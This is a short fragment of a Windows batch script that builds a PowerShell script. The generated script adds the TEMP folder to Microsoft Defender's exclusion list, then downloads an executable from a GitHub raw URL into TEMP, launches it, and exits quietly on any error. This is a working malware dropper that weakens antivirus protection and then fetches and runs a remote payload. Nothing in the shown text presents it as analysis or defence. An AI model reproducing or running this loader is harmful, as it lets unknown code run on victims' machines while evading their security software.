...
:: We use '^' to escape characters like '&' and '>' for the echo command
>  "%PS1%" echo Add-MpPreference -ExclusionPath $env:TEMP
>> "%PS1%" echo $url = 'https://github.com/Ta0755/DownloadFilesd/raw/main/SUNMT1VEX0VZRQ.exe'
>> "%PS1%" echo $outputFile = Join-Path $env:TEMP 'NAME.exe'
>> "%PS1%" echo Start-Sleep -Milliseconds 100 
>> "%PS1%" echo try {
>> "%PS1%" echo     Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
>> "%PS1%" echo     Start-Process -FilePath $outputFile
>> "%PS1%" echo } catch {
>> "%PS1%" echo     exit 1
>> "%PS1%" echo }
